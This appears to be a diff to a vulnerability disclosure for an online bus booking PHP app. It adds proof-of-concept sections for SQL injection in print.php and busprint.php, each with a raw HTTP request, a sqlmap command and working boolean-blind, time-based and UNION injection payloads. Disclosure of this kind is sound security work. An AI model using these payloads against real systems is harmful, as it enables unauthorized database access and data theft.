@@ -374,6 +374,45 @@ can use `sqlmap -u http://onlinebus/print.php?pid=52` to verify it
 
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
+POC:
+
+```
+GET /onlinebus/print.php?pid=52 HTTP/1.1
+Host: 192.168.253.1
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/sindex.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+```
+
+`sqlmap -r r.txt`
+
+![1706534379479](https://github.com/gtqbhksl/weekdays_something/assets/113713406/9ab5fee0-9e32-4322-90d8-c756045535e4)
+
+```
+Parameter: pid (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: pid=(SELECT (CASE WHEN (8557=8557) THEN 52 ELSE (SELECT 9263 UNION SELECT 8903) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pid=52 AND (SELECT 3421 FROM (SELECT(SLEEP(5)))mwzB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pid=52 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b7a71,0x4679574546665a5863784855456c626f596464586d47544f77764f6e624841444b58685a4d5a4251,0x7170787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+
+```
+
+
+
 # 8. busprint.php sql injection
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/2c023471-b205-48ac-aa98-8c3c4cce366e)
@@ -390,6 +429,45 @@ $sel="SELECT * FROM `bustransactions` WHERE `T_No.` =$pid";
 can use `sqlmap -u http://onlinebus/busprint.php?pid=7` to verify it
 
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
+
+
+POC:
+
+```
+GET /onlinebus/busprint.php?pid=52 HTTP/1.1
+Host: 192.168.253.1
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/sindex.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+```
+
+`sqlmap -r r.txt`
+
+![1706534379495](https://github.com/gtqbhksl/weekdays_something/assets/113713406/f829c380-2eb5-4582-82ba-07c92ae1416b)
+
+
+```
+Parameter: pid (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: pid=(SELECT (CASE WHEN (8557=8557) THEN 52 ELSE (SELECT 9263 UNION SELECT 8903) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pid=52 AND (SELECT 3421 FROM (SELECT(SLEEP(5)))mwzB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: pid=52 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b7a71,0x4679574546665a5863784855456c626f596464586d47544f77764f6e624841444b58685a4d5a4251,0x7170787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+
+```
 
 # 9. buspayaction.php sql injection
 
